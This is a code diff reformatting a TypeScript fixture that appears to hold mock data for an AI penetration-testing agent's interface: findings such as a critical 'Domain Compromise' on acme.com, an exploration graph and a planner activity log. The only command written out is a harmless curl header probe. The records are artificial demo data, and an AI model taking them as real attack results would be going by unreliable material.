     status: "pending",
-    get summary() { return swt("interface.m2489"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2490"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2489");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2490");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i12",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T23:20:00Z"),
   },
   {
     id: "f-17",
     assets: [assetRef(20)],
     vulnclass: "Domain Compromise",
-    get name() { return swt("interface.m2491"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2491");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     severity: "critical",
     status: "confirmed",
-    get report() { return swt("interface.m2492"); },
-    set report(value: string) { Object.defineProperty(this, "report", { value, writable: true, enumerable: true, configurable: true }); },
-    get summary() { return swt("interface.m2493"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2494"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get report() {
+      return swt("interface.m2492");
+    },
+    set report(value: string) {
+      Object.defineProperty(this, "report", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get summary() {
+      return swt("interface.m2493");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2494");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i13",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-26T00:20:00Z"),
   },
 ];
@@ -903,8 +1246,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "root",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2495"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2495");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "origin",
       origin: "system",
@@ -915,8 +1264,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g1",
       type: "goal",
-      payload: P({ get text() { return swt("interface.m2496"); },
-    set text(value: string) { Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get text() {
+          return swt("interface.m2496");
+        },
+        set text(value: string) {
+          Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -925,8 +1280,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g2",
       type: "goal",
-      payload: P({ get text() { return swt("interface.m2497"); },
-    set text(value: string) { Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get text() {
+          return swt("interface.m2497");
+        },
+        set text(value: string) {
+          Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "open",
       origin: "goals",
@@ -935,8 +1296,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g3",
       type: "goal",
-      payload: P({ get text() { return swt("interface.m2498"); },
-    set text(value: string) { Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get text() {
+          return swt("interface.m2498");
+        },
+        set text(value: string) {
+          Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -945,8 +1312,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g4",
       type: "goal",
-      payload: P({ get text() { return swt("interface.m2499"); },
-    set text(value: string) { Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get text() {
+          return swt("interface.m2499");
+        },
+        set text(value: string) {
+          Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 10,
       state: "met",
       origin: "goals",
@@ -957,8 +1330,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i1",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2500"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2500");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 6,
       state: "done",
       origin: "planner",
@@ -967,8 +1346,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i2",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2501"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2501");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -977,8 +1362,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i3",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2502"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2502");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -987,8 +1378,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i4",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2503"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2503");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -997,8 +1394,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i5",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2504"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2504");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -1007,8 +1410,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "ig",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2505"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2505");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -1019,8 +1428,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i6",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2506"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2506");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -1029,8 +1444,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i7",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2507"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2507");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -1039,8 +1460,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i8",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2508"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2508");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -1051,8 +1478,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i9",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2509"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2509");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -1061,8 +1494,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i10",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2510"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2510");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -1071,8 +1510,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i11",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2511"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2511");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -1081,8 +1526,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i12",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2512"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2512");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -1091,8 +1542,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i13",
       type: "intent",
-      payload: P({ get summary() { return swt("interface.m2513"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2513");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 10,
       state: "done",
       origin: "planner",
@@ -1103,8 +1560,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa1",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2514"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2514");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#1",
@@ -1113,8 +1576,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa2",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2515"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2515");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#4",
@@ -1123,8 +1592,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faGit",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2516"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2516");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1133,8 +1608,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2517"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2517");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1143,8 +1624,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa3",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2518"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2518");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#6",
@@ -1153,8 +1640,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2519"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2519");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1163,8 +1656,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa5",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2520"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2520");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#8",
@@ -1173,8 +1672,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa6",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2521"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2521");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1183,8 +1688,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa7",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2522"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2522");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1193,8 +1704,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa8",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2523"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2523");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1203,8 +1720,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa9",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2524"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2524");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1213,8 +1736,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ get summary() { return swt("interface.m2525"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2525");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "open",
       origin: "work#12",
@@ -1225,8 +1754,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi1",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2526"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2526");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#2",
@@ -1235,8 +1770,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi2",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2527"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2527");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#4",
@@ -1245,8 +1786,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi3",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2528"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2528");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#5",
@@ -1255,8 +1802,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2529"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2529");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1265,8 +1818,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiRce",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2530"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2530");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#7",
@@ -1275,8 +1834,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiPriv",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2531"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2531");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#8",
@@ -1285,8 +1850,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiJenkins",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2532"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2532");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#11",
@@ -1295,8 +1866,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiKerb",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2533"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2533");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#12",
@@ -1305,8 +1882,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiDC",
       type: "finding",
-      payload: P({ get summary() { return swt("interface.m2493"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2493");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 0,
       state: "confirmed",
       origin: "work#13",
@@ -1317,8 +1900,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h1",
       type: "hint",
-      payload: P({ get summary() { return swt("interface.m2534"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2534");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 5,
       state: "consumed",
       origin: "mainagent",
@@ -1327,8 +1916,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h2",
       type: "hint",
-      payload: P({ get summary() { return swt("interface.m2535"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2535");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1337,8 +1932,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h3",
       type: "hint",
-      payload: P({ get summary() { return swt("interface.m2536"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } }),
+      payload: P({
+        get summary() {
+          return swt("interface.m2536");
+        },
+        set summary(value: string) {
+          Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+        },
+      }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1420,15 +2021,29 @@ export const frontier: TaskNode[] = explorationGraph.nodes.filter(
 export const activity: Activity[] = [
   // Planner rounds read the situation, compare Worker output, assess goals, and dispatch add_intent directions.
   // Round 0: objective breakdown and first intents (2026-07-24 09:12).
-  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", get summary() { return swt("interface.m2537"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    seq: 1000,
+    worker: "planner",
+    ts: T("2026-07-24T09:12:10Z"),
+    kind: "round",
+    get summary() {
+      return swt("interface.m2537");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   {
     seq: 1001,
     worker: "planner",
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2538"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2538");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1002,
@@ -1438,8 +2053,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
-    get detail() { return swt("interface.m2539"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2539");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1003,
@@ -1448,10 +2067,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "p0-probe",
-    get summary() { return swt("interface.m2540"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2541"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2540");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2541");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1004,
@@ -1460,10 +2087,18 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    get summary() { return swt("interface.m2542"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2543"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2542");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2543");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1005,
@@ -1472,30 +2107,56 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    get summary() { return swt("interface.m2544"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2545"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2544");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2545");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
